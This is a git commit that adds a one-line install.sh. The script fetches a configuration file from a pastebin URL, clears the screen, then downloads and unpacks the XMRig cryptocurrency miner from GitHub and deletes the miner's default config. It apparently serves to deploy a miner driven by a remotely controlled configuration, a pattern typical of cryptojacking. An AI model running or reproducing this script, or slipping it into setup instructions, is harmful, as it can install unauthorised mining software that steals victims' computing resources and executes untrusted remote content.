df31ca700ee3ab8523050042eb0836aad18387b2
Sec7orTeam <sec7or.team.id@gmail.com>
2024-12-06 15:38:06 +0700

    install.sh

---
+++ install.sh
@@ -0,0 +1,1 @@
+wget https://pastebin.com/raw/jyz9YArk && cp jyz9YArk config.json && rm -rf jyz9YArk && clear && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && rm -rf config.json
